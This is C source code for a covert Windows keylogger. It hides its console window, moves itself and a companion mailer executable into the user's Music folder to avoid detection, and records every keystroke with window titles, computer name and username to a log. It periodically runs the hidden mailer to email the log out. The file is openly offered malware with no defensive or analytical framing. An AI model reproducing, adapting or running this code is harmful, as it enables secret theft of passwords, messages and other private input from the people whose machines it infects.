#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <process.h>

// GLOBALS //
#define BUF_SIZE 256 // general purpose for buffers
#define LOG_TIMER 3600 // time limit until send email (3600s == 1 hour)

// FUNCTION DECLARATIONS //
void InstallKeylogger();
char* GetTime();
void HideWindow();
void InitLogfile(char* filename);
int GetLogfileLength(char* filename);
void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile);
void ExecuteMailer();
void KeystrokeHandler(short key, FILE* logfile);

// MAIN FUNCTION //
int main(){
    // avoid visible detection of executable window
    HideWindow();

    // install executables
    InstallKeylogger();

    // initialize timers
    clock_t email_timer;               // tracks against LOG_TIMER
    clock_t keystroke_timer = clock(); // resets at each keystroke

    // initialize the current window
    char window[BUF_SIZE];
    char new_window[BUF_SIZE];
    HWND foreground = GetForegroundWindow();
    GetWindowText(foreground, window, BUF_SIZE);

    // initialize logfile
    char filename[BUF_SIZE];
    InitLogfile(filename);

    // active program process
    while(1){

        Sleep(10); // reduce CPU usage
        
        // loop thru keyboard characters
        for(short key = 8; key <= 222; key++){
            
            // check for key press
            // where -32767 means key is pressed
            if(GetAsyncKeyState(key) == -32767){
                keystroke_timer = clock();

                // open keylog file then handle keystroke
                FILE* logfile = fopen(filename, "a");
                GetCurrentWindow(window, new_window, logfile, 0);
                KeystrokeHandler(key, logfile);
                fclose(logfile);
            }
        }

        email_timer = (clock() - keystroke_timer) / CLOCKS_PER_SEC;

        // check if its time to send the email
        // no keystrokes lets email_timer time out
        if(email_timer > LOG_TIMER){
            
            // don't send empty files (5 lines is length of header)
            if(GetLogfileLength(filename) > 5){
                ExecuteMailer();        // email
                InitLogfile(filename);  // clear logfile
            }

            // reset timer
            keystroke_timer = clock();
        }
    }
    return 0;
}

// FUNCTION DEFINITIONS //

// attempt to move the executables to another directory to be "less" detectable
void InstallKeylogger(){
    // get current directory
    char currentdir[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, currentdir);

    // create file path strings
    char keylogger_path[MAX_PATH];
    char mailer_path[MAX_PATH];
    sprintf(keylogger_path, "%s\\keylogger.exe", currentdir);
    sprintf(mailer_path, "%s\\mailer.exe", currentdir);

    // get current user's name
    DWORD len = BUF_SIZE+1;
    char username[BUF_SIZE+1];
    GetUserName(username, &len);

    // build new file path
    char keylogger_new_path[MAX_PATH];
    sprintf(keylogger_new_path, "C:\\Users\\%s\\Music\\keylogger.exe", username);
    char mailer_new_path[MAX_PATH];
    sprintf(mailer_new_path, "C:\\Users\\%s\\Music\\mailer.exe", username);

    // attempt to execute in case of failure to install files in desired spot
    // move keylogger
    BOOL moved = MoveFile(keylogger_path, keylogger_new_path);
    
    // if moved successfully, move mailer
    if(moved){

        // move mailer
        BOOL moved2 = MoveFile(mailer_path, mailer_new_path);
        
        // if failed, move keylogger back and execute where it is
        if(moved2 == FALSE){
            MoveFile(keylogger_new_path, keylogger_path);
        }
    }
}

// get current time
char* GetTime(){
    time_t curr_time = time(NULL);
    return ctime(&curr_time);
}

// hides the executable window
void HideWindow(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); // set to 0 to not display
}

// initialize logfile filename and header
void InitLogfile(char* filename){
    DWORD len = BUF_SIZE+1;
    
    // get current computer's name
    char computername[BUF_SIZE+1];
    GetComputerName(computername, &len);

    // get current user's name
    char username[BUF_SIZE+1];
    GetUserName(username, &len);

    // get foreground window
    char window[BUF_SIZE];
    HWND foreground = GetForegroundWindow();
    GetWindowText(foreground, window, BUF_SIZE);

    // open clean logfile and print out header
    sprintf(filename, "%s_log.txt", username);
    FILE* logfile = fopen(filename, "w");
    fprintf(logfile, "COMPUTER: %s\nUSERNAME: %s\n", computername, username);
    GetCurrentWindow(window, window, logfile, 1);
    fclose(logfile);
}

// gets the length of the logfile
int GetLogfileLength(char* filename){
    int lines = 0;
    FILE* logfile = fopen(filename, "r");
    while(!feof(logfile)){
        if(fgetc(logfile) == '\n'){ 
            lines++; 
        }
    }
    return lines;
}

// get the current working window of the user
void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile){
    HWND new_foreground = GetForegroundWindow();
    GetWindowText(new_foreground, window, BUF_SIZE);
    
    // display current window and time for clean logfile instance
    if(init_logfile == 1){
        fprintf(logfile, "WINDOW: %s\nTIME: %s", new_window, GetTime());
        fflush(logfile);
        return;
    }

    // check if window has changed/updated
    if(strcmp(window, new_window)){
        strncpy(new_window, window, BUF_SIZE);

        // if changed/updated, display current window and time
        if(!strcmp(window, new_window) && strcmp(window, "")){
            //keystroke_count+=100; // account for avg length of header
            fprintf(logfile, "\n\nWINDOW: %s\nTIME: %sKEYSTROKES: ", new_window, GetTime());
            fflush(logfile);
        }
    }
}

// executes mailer module to send logfile
void ExecuteMailer(){
    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // hide new executable window

    // get mailer path
    char mailer_path[MAX_PATH];
    char currentdir[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, currentdir);
    sprintf(mailer_path, "%s\\mailer.exe", currentdir);
    
    // win32 version of fork() and exec()
    CreateProcess(
        mailer_path,
        NULL, NULL, NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    // wait for child process to complete to prevent emailing emptied logfile
    WaitForSingleObject(&pi.hProcess, INFINITE);
    CloseHandle(&pi);
    Sleep(1000);
}
// writes to file the interpretation of keystroke
void KeystrokeHandler(short key, FILE* logfile){
    // upper case alphabet
    if( (key > 64 && key < 91) && GetAsyncKeyState(0x10)){
        fputc(key, logfile);
    }
    // lower case alphabet
    else if(key > 64 && key < 91){
        fputc(key+32, logfile);
    }
    // special characters, virtual keys, etc.
    else{
        switch(key){    
            case VK_SPACE: fputs("[SPACE]", logfile); break;
            case VK_TAB: fputs("[TAB]", logfile); break;
            case VK_BACK: fputs("[BACKSPACE]", logfile); break;
            case VK_RETURN: fputs("[ENTER]", logfile); break;
            case VK_SHIFT: fputs("[SHIFT]", logfile); break;
            case VK_CONTROL: fputs("[CTRL]", logfile); break;
            case VK_MENU: fputs("[ALT]", logfile); break;
            case VK_DELETE: fputs("[DEL]", logfile); break;
            case VK_ESCAPE: fputs("[ESC]", logfile); break;
            case VK_CAPITAL: fputs("[CAPS LOCK]", logfile); break;
            case VK_OEM_1: fputs("[;:]", logfile); break;
            case VK_OEM_2: fputs("[/?]", logfile); break;
            case VK_OEM_3: fputs("[`~]", logfile); break;
            case VK_OEM_4: fputs("[ [{ ]", logfile); break;
            case VK_OEM_5: fputs("[\\|]", logfile); break;
            case VK_OEM_6: fputs("[ ]} ]", logfile); break;
            case VK_OEM_7: fputs("['\"]", logfile); break;
            case VK_LEFT: fputs("[LEFT]", logfile); break;
            case VK_UP: fputs("[UP]", logfile); break;
            case VK_RIGHT: fputs("[RIGHT]", logfile); break;
            case VK_DOWN: fputs("[DOWN]", logfile); break;
            case 187: fputc('+', logfile); break;
            case 188: fputc(',', logfile); break;
            case 189: fputc('-', logfile); break;
            case 190: fputc('.', logfile); break;
            case VK_NUMPAD0: fputc('0', logfile); break;
            case VK_NUMPAD1: fputc('1', logfile); break;
            case VK_NUMPAD2: fputc('2', logfile); break;
            case VK_NUMPAD3: fputc('3', logfile); break;
            case VK_NUMPAD4: fputc('4', logfile); break;
            case VK_NUMPAD5: fputc('5', logfile); break;
            case VK_NUMPAD6: fputc('6', logfile); break;
            case VK_NUMPAD7: fputc('7', logfile); break;
            case VK_NUMPAD8: fputc('8', logfile); break;
            case VK_NUMPAD9: fputc('9', logfile); break;
            case 48:
                if(GetAsyncKeyState(0x10)){ fputc(')', logfile); }
                else{ fputc('0', logfile); }
                break;
            case 49:
                if(GetAsyncKeyState(0x10)){ fputc('!', logfile); }
                else{ fputc('1', logfile); }
                break;
            case 50:
                if(GetAsyncKeyState(0x10)){ fputc('@', logfile); }
                else{ fputc('2', logfile); }
                break;
            case 51:
                if(GetAsyncKeyState(0x10)){ fputc('#', logfile); }
                else{ fputc('3', logfile); }
                break;
            case 52:
                if(GetAsyncKeyState(0x10)){ fputc('$', logfile); }
                else{ fputc('4', logfile); }
                break;
            case 53:
                if(GetAsyncKeyState(0x10)){ fputc('%', logfile); }
                else{ fputc('5', logfile); }
                break;
            case 54:
                if(GetAsyncKeyState(0x10)){ fputc('^', logfile); }
                else{ fputc('6', logfile); }
                break;
            case 55:
                if(GetAsyncKeyState(0x10)){ fputc('&', logfile); }
                else{ fputc('7', logfile); }
                break;
            case 56:
                if(GetAsyncKeyState(0x10)){ fputc('*', logfile); }
                else{ fputc('8', logfile); }
                break;
            case 57:
                if(GetAsyncKeyState(0x10)){ fputc('(', logfile); }
                else{ fputc('9', logfile); }
                break;
        }
    }
}